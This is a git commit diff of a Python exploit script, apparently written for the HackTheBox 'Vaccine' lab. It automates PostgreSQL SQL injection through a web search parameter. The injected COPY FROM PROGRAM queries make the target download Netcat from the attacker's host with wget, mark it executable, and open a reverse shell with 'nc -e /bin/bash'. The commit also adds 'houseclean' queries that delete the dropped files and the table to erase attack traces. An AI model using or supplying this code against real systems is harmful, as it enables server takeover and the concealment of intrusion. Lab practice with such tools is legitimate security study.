0c34293470464a642ec21db41d67a5d62c647271
lkim94 <83319068+lkim94@users.noreply.github.com>
2021-08-25 20:34:52 -0400

    Update PostgreSQL-Shell.py

--- PostgreSQL-Shell.py
+++ PostgreSQL-Shell.py
@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 
-# ORIGINAL SOURCE
+# ORIGINAL SOURCES
+# https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
 # https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
 # Modifier: lkim94
 
@@ -19,7 +20,7 @@
 
 # CAUTION
 # The shell disconnects when there's a few minutes of inactivity.
-# Terminating this program's process while the shell is active can also cause unexpected disconnection.
+# Terminating this program's process while the shell is active can also cause unexpected disconnection, and improper houseclean.
 
 # USAGE
 # nc -lvnp <listen_port#>
@@ -29,7 +30,8 @@
 # python3 PostgreSQL-Shell.py -L 10.10.14.44 -l 4444 -t 10.10.10.46 -p dashboard.php?search=car -c PHPSESSID=akebd2jzejfk47n3n3xucj4vem
 
 
-import argparse, requests, random, os, threading, time, sys
+import argparse, requests, random, os, sys, http.server, socketserver, time
+from multiprocessing import Process
 
 # Function for handling command arguments.
 def get_arguments():
@@ -42,42 +44,40 @@ def get_arguments():
     values = parser.parse_args()
     return values.lhost, values.lport, values.target, values.parameter, values.cookie
 
-# Function for copying a Netcat binary file to the local /tmp directory and hosting a web server on it.
-def start_http_server():
-    print(f"\n[+] Copying Netcat binary to the local /tmp directory...")
+# Function for copying a Netcat binary file to the local /tmp directory and transferring it to the target server.
+def transfer_nc():
+    port = 8080
+
+    print(f"\t[+] Copying Netcat binary to the local /tmp directory...")
     os.system('cp /usr/bin/nc /tmp')
 
-    print(f"\n[+] Setting up HTTP server on port 8080 on /tmp directory...")
-    os.system('cd /tmp; python3 -m http.server 8080')
+    print(f"\t[+] Temporarily hosting HTTP server on port {port} on /tmp directory...")
+    Handler = http.server.SimpleHTTPRequestHandler
+    httpd = socketserver.TCPServer(('', port), Handler)
+    os.chdir('/tmp')
+    httpd.handle_request()
 
-    print("\n[+] Removing Netcat binary from the local /tmp directory...")
+    print("\t[+] Netcat binary file transferred and HTTP server closed.")
     os.system('rm /tmp/nc')
+    print(f"\t[+] Removed /tmp/nc.")
 
-# Function for sending the SQLI queries that downloads Netcat binary, and execute it to initiate reverese shell.
-def send_queries(lhost, lport, cookie, url, suffix):
-    table_dropq = f"{url}';DROP TABLE IF EXISTS cmd_{suffix}; -- -"
-    table_creationq = f"{url}';CREATE TABLE cmd_{suffix}(cmd_output text); -- -"
-    netcat_downloadq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'wget -P /tmp/{suffix} http://{lhost}:8080/nc'; -- -"
-    netcat_chmodq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'chmod 777 /tmp/{suffix}/nc'; -- -"
-    revshellq = f"{url}';COPY cmd_{suffix} FROM PROGRAM '/tmp/{suffix}/nc -e /bin/bash {lhost} {lport}'; -- -"
+# Function for deleting attack trace.
+def send_houseclean_queries(cookie, url, suffix):
+    try:
+        table_dropq = f"{url}';DROP TABLE IF EXISTS cmd_{suffix}; -- -"
+        housecleanq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'rm -r /tmp/{suffix}'; -- -"
+        request = requests.Session()
 
-    request = requests.Session()
+        print(f"\n[+] Deleting /tmp/{suffix} directory...\n[+] Query => {housecleanq}")
+        request.get(housecleanq, cookies=cookie)
 
-    print(f"\n[+] Sending a table drop query...\n[+] Query => {table_dropq}")
-    r = request.get(table_dropq, cookies=cookie)
+        print(f"\n[+] Sending a table drop query...\n[+] Query => {table_dropq}")
+        request.get(table_dropq, cookies=cookie)
 
-    print(f"\n[+] Sending a table creation query...\n[+] Query => {table_creationq}")
-    r = request.get(table_creationq, cookies=cookie)
+        print("\n[+] Exiting.")
 
-    print(f"\n[+] Sending a Netcat download query...\n[+] Query => {netcat_downloadq}")
-    r = request.get(netcat_downloadq, cookies=cookie)
-
-    print(f"\n[+] Sending a chmod query for Netcat...\n[+] Query => {netcat_chmodq}")
-    r = request.get(netcat_chmodq, cookies=cookie)
-
-    print(f"\n[+] Sending a reverse shell execution query...\n[+] Query => {revshellq}")
-    r = request.get(revshellq, cookies=cookie)
-
+    except KeyboardInterrupt:
+        print("\n[!] Exiting.")
 
 try:
     user_input = get_arguments()
@@ -88,13 +88,52 @@ try:
     cookie = user_input[4].split("=")
     cookie = {cookie[0]:cookie[1]}
     url = f"http://{target}/{param}"
-    suffix = random.randrange(1000, 9999)
+    suffix = "casey"
 
-    http_server_thread = threading.Thread(target=start_http_server)
-    query_thread = threading.Thread(target=send_queries, args=(lhost,lport,cookie,url,suffix))
+    table_dropq = f"{url}';DROP TABLE IF EXISTS cmd_{suffix}; -- -"
+    table_creationq = f"{url}';CREATE TABLE cmd_{suffix}(cmd_output text); -- -"
+    netcat_downloadq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'wget -P /tmp/{suffix} http://{lhost}:8080/nc'; -- -"
+    netcat_chmodq = f"{url}';COPY cmd_{suffix} FROM PROGRAM 'chmod 777 /tmp/{suffix}/nc'; -- -"
+    revshellq = f"{url}';COPY cmd_{suffix} FROM PROGRAM '/tmp/{suffix}/nc -e /bin/bash {lhost} {lport}'; -- -"
 
-    http_server_thread.start(); time.sleep(3)
-    send_queries(lhost, lport, cookie, url, suffix)
+    request = requests.Session()
+    nc_transfer_process = Process(target=transfer_nc)
+
+    print(f"\n[+] Sending a table drop query...\n[+] Query => {table_dropq}")
+    request.get(table_dropq, cookies=cookie)
+
+    print(f"\n[+] Sending a table creation query...\n[+] Query => {table_creationq}")
+    request.get(table_creationq, cookies=cookie)
+
+    print(f"\n[+] Starting HTTP server...")
+    nc_transfer_process.start(); time.sleep(3)
+
+    print(f"\n[+] Sending a Netcat download query...\n[+] Query => {netcat_downloadq}")
+    request.get(netcat_downloadq, cookies=cookie)
+    nc_transfer_process.join()
+
+    print(f"\n[+] Sending a chmod query for Netcat...\n[+] Query => {netcat_chmodq}")
+    request.get(netcat_chmodq, cookies=cookie)
+
+    print(f"\n[+] Sending a reverse shell execution query...\n[+] Query => {revshellq}")
+    print(f"[+] Press 'Ctrl + C' on the shell (not here) to disconnect and perform houseclean.")
+    request.get(revshellq, cookies=cookie)
+
+    send_houseclean_queries(cookie, url, suffix)
 
 except KeyboardInterrupt:
+    send_houseclean_queries(cookie, url, suffix)
+    sys.exit()
+
+except ConnectionResetError:
+    print("\n[!] ERROR: Connection lost.")
+    send_houseclean_queries(cookie, url, suffix)
+    sys.exit()
+
+except http.client.RemoteDisconnected:
+    send_houseclean_queries(cookie, url, suffix)
+    sys.exit()
+
+except requests.exceptions.ConnectionError:
+    send_houseclean_queries(cookie, url, suffix)
     sys.exit()
